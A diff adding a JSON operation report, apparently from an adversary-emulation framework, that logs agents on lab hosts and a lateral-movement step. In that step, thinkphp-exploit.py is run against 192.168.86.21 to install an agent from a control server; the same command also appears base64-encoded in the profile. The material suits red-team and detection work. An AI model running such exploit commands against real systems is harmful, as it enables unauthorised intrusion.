@@ -1,0 +1,240 @@
+{
+    "name": "ThinkPHP Test off",
+    "id": 5,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "kali$root",
+            "last_seen": "2019-10-02 19:17:58",
+            "architecture": "amd64",
+            "platform": "linux",
+            "server": "http://192.168.86.28:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-linux",
+            "pid": 39932,
+            "ppid": 5626,
+            "trusted": 1,
+            "last_trusted_seen": "2019-10-02 19:17:58",
+            "sleep_min": 60,
+            "sleep_max": 60,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        },
+        {
+            "id": 2,
+            "paw": "raspberrypi$www-data",
+            "last_seen": "2019-10-02 19:16:42",
+            "architecture": "arm",
+            "platform": "linux",
+            "server": "http://192.168.86.28:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-arm",
+            "pid": 20273,
+            "ppid": 20260,
+            "trusted": 1,
+            "last_trusted_seen": "2019-10-02 19:16:42",
+            "sleep_min": 60,
+            "sleep_max": 60,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "shellcode_arm",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2019-10-02 19:17:17",
+    "facts": [
+        {
+            "id": 1,
+            "property": "file.sensitive.extension",
+            "value": "txt",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 2,
+            "property": "file.sensitive.extension",
+            "value": "yml",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 3,
+            "property": "host.service.modifiable",
+            "value": "fax",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 4,
+            "property": "target.org.name",
+            "value": "mitre.org",
+            "score": 1,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 5,
+            "property": "remote.host.ip",
+            "value": "192.168.86.21",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        }
+    ],
+    "finish": "2019-10-02 19:18:09",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 6,
+        "adversary_id": "bd8fd187-4fd5-4fcc-bf19-a8432d7520c3",
+        "name": "thinkphp",
+        "description": "only exploits thinkphp",
+        "phases": {
+            "1": [
+                {
+                    "id": 132,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 132,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 50
+                },
+                {
+                    "id": 131,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 131,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 50
+                },
+                {
+                    "id": 134,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 134,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 50
+                },
+                {
+                    "id": 133,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 133,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 50
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+            "paw": "kali$root",
+            "command": "python3 thinkphp-exploit.py -i 192.168.86.21 -s http://192.168.86.28:8888",
+            "delegated": "2019-10-02 19:17:46.323987",
+            "run": "2019-10-02 19:17:58",
+            "status": 1,
+            "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+            "name": "Exploit ThinkPHP",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+            "paw": "raspberrypi$www-data",
+            "command": "python3 thinkphp-exploit.py -i 192.168.86.21 -s http://192.168.86.28:8888",
+            "delegated": null,
+            "run": null,
+            "status": -2,
+            "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+            "name": "Exploit ThinkPHP",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        }
+    ]
+}
